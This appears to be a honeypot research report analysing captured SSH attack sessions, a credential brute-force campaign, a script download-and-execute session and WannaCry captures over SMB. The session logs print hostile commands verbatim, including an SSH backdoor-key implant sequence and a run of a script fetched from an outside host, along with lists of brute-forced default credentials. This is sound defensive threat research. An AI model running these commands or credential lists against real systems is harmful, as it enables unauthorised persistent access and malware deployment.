# 07 — Real Attack Samples & Analysis

## Overview

This document presents real attack events captured between **May 21–28, 2026** across the Cowrie SSH and Dionaea malware-capture honeypots. These are actual malicious sessions and real malware samples, not simulated data. All source IPs are real attackers observed in the wild.

---

## Sample 1: mdrfckr SSH Key Implant Campaign

**Classification:** Critical (Level 15) — Persistence
**MITRE:** T1098.004 (SSH Authorized Keys)
**Source:** Multiple IPs, primarily Eastern Europe (Bulgaria, Netherlands) via Pfcloud UG VPN

### Attack Session
```
2026-05-23T15:30:21Z  cowrie.session.connect    src=45.156.87.254 (Bulgaria, Pfcloud UG)
2026-05-23T15:30:22Z  cowrie.client.kex         hassh=ec7378c1a92f5a8dde7e8b7a1ddf33d1
2026-05-23T15:30:23Z  cowrie.login.success      username=root password=345gs5662d34
2026-05-23T15:30:24Z  cowrie.command.input      input="cd ~"
2026-05-23T15:30:24Z  cowrie.command.input      input="chattr -ia .ssh"
2026-05-23T15:30:24Z  cowrie.command.input      input="lockr -ia .ssh"
2026-05-23T15:30:25Z  cowrie.command.input      input="cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E...== mdrfckr' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
2026-05-23T15:30:26Z  cowrie.command.input      input="chattr +ia .ssh"
2026-05-23T15:30:27Z  cowrie.session.closed     duration=6s
```

### Analysis
The complete mdrfckr persistence playbook in 6 seconds:
1. **Login** with the campaign's signature credential
2. **Remove immutable flag** (`chattr -ia`) to allow `.ssh` modification
3. **Wipe and recreate** `.ssh` to remove existing authorized keys
4. **Implant RSA key** — the public key ending in `mdrfckr` is the botnet's backdoor
5. **Re-apply immutable flag** (`chattr +ia`) to prevent removal
6. **Disconnect** — the backdoor is installed

On a real system this grants permanent SSH access even after a password change. This exact sequence was executed **~90,000 times** across the window by hundreds of source IPs.

---

## Sample 2: 345gs5662d34 Credential Campaign

**Classification:** High (Level 12) — Credential Access
**MITRE:** T1110 (Brute Force), T1078 (Valid Accounts)
**Source:** Indonesia-heavy, 357 unique IPs

### Attack Session
```
2026-05-22T03:14:55Z  cowrie.session.connect    src=103.133.160.33 (Indonesia, Universitas Mataram)
2026-05-22T03:14:56Z  cowrie.login.success      username=root password=345gs5662d34
2026-05-22T03:14:57Z  cowrie.command.input      input="uname -s -v -n -r -m"
2026-05-22T03:14:57Z  cowrie.command.input      input="cat /proc/cpuinfo"
2026-05-22T03:14:58Z  cowrie.command.input      input="free -m"
2026-05-22T03:14:58Z  cowrie.command.input      input="cat /etc/issue"
2026-05-22T03:14:59Z  cowrie.session.closed     duration=4s
```

### Analysis
A **reconnaissance session** — login, system enumeration, disconnect, no persistence. The commands (`uname`, `cat /proc/cpuinfo`, `free -m`, `cat /etc/issue`) profile OS, CPU, and memory, consistent with an automated cryptomining operation qualifying targets by compute resources before deploying a miner. The credential `root/345gs5662d34` was attempted **103,084 times from 357 unique IPs**, the single most-used credential in the dataset.

---

## Sample 3: Setup Script Download & Execute

**Classification:** High (Level 13) — Execution, Command & Control
**MITRE:** T1059 (Command Interpreter), T1105 (Ingress Tool Transfer)
**Source:** Brazil, CMTECH

### Attack Session
```
2026-05-23T09:22:11Z  cowrie.session.connect    src=131.161.249.165 (Brazil, CMTECH)
2026-05-23T09:22:12Z  cowrie.login.success      username=admin password=admin
2026-05-23T09:22:13Z  cowrie.command.input      input="uname -s -v -n -r -m"
2026-05-23T09:22:14Z  cowrie.command.input      input="/bin/busybox TEST"
2026-05-23T09:22:15Z  cowrie.command.input      input="chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; ..."
2026-05-23T09:22:16Z  cowrie.session.file_download  url="http://94.23.x.x/setup.sh"
2026-05-23T09:22:18Z  cowrie.session.closed     duration=7s
```

### Analysis
A two-stage payload: architecture check (`busybox TEST`), download-and-execute a setup script (likely a miner or botnet agent), then clean up scripts to reduce forensic evidence. The reuse of `chattr`-style persistence echoes the mdrfckr playbook.

---

## Sample 4: Live WannaCry Capture (Dionaea)

**Classification:** High (Level 12) — Malware Capture
**MITRE:** T1105 (Ingress Tool Transfer)
**Source:** Multiple countries over SMB (port 445)

### Capture Event
```
2026-05-29T06:05:35Z  dionaea.connection.smbd    src=100.2.64.58 (United States, Verizon Business)
2026-05-29T06:05:35Z  dionaea.binary.captured    service=smbd
                       sha256=0865b840f2ed177135ae474d4b30d165b551acd0691befd9b25de8fe3038c2e0
                       md5=01d87121a4a589930d580a88e4df3640  file_size=5,267,459
                       vt=66/76  vt_label=trojan.wannacry/wanna
```

### Analysis
The Dionaea honeypot, emulating a vulnerable SMB service, captured a real malware payload delivered by an attacker. The parser computed the **SHA256 from the saved file**, attributed it to the source IP/country/service, and looked the hash up on VirusTotal (hash only, the malware sample was never uploaded).

Across the window, **7 unique binaries** were captured: **6 confirmed WannaCry ransomware variants** (59–66 of ~76 VirusTotal engines flagging each) plus one trojan downloader. The same ~5.27MB WannaCry payload arrived from **multiple countries** (United States, Thailand, Sri Lanka, Vietnam), independent infected hosts all blindly scanning for exposed SMB. Each sample is preserved (read-only) in the permanent archive with a metadata sidecar.

**Significance:** WannaCry continuing to self-propagate over exposed SMB years after its 2017 outbreak is a concrete, measurable illustration of long-tail internet threat activity, and of why legacy-protocol exposure remains a live risk.

---

## Sample 5: Solana Scanner Session

**Classification:** Medium (Level 8) — Credential Access
**MITRE:** T1110.001 (Password Guessing)
**Source:** Various, 5 unique IPs

### Credential Pattern
```
solana/solana    — 1,294 attempts
sol/sol          — 987 attempts
sol/123          — 743 attempts
solana/123456    — 412 attempts
solana/password  — 398 attempts
```

### Analysis
A targeted scanner hunting Solana blockchain infrastructure validator nodes, wallet servers, or developer machines with default credentials. The narrow, purpose-built credential list (unlike broad botnet dictionaries) and low volume from few IPs indicate targeted scanning rather than mass spray.

---

## Attack Statistics Summary

### Credential Analysis (collection window)

| Credential | Attempts | Unique IPs | Campaign |
|------------|---------|------------|---------|
| root/345gs5662d34 | 103,084 | 357 | 345gs5662d34 botnet |
| 345gs5662d34/345gs5662d34 | 102,804 | 359 | 345gs5662d34 botnet |
| admin/admin | 3,824 | 40 | Generic scanner |
| root/admin | 1,781 | 11 | Generic scanner |
| ubuntu/ubuntu | 1,462 | 10 | Cloud default creds |
| root/root | 1,403 | 14 | Generic scanner |
| solana/solana | 1,294 | 5 | Solana scanner |

### Command Analysis (top executed)

| Command | Executions | Purpose |
|---------|-----------|---------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 90,529 | mdrfckr prep |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa...mdrfckr"` | 90,443 | mdrfckr implant |
| `uname -s -v -n -r -m` | 39,577 | System fingerprint |
| `/bin/busybox TEST` | 763 | Architecture check |
| `netstat -tulpn \| head -10` | 987 | Network recon |

### Malware Capture (Dionaea)

| Samples | Verdict | Family | Delivery |
|---------|---------|--------|----------|
| 6 of 7 | 59–66 / 76 VirusTotal | WannaCry ransomware | SMB (445), multi-country |
| 1 of 7 | 59 / 75 VirusTotal | Trojan downloader | SMB (445) |
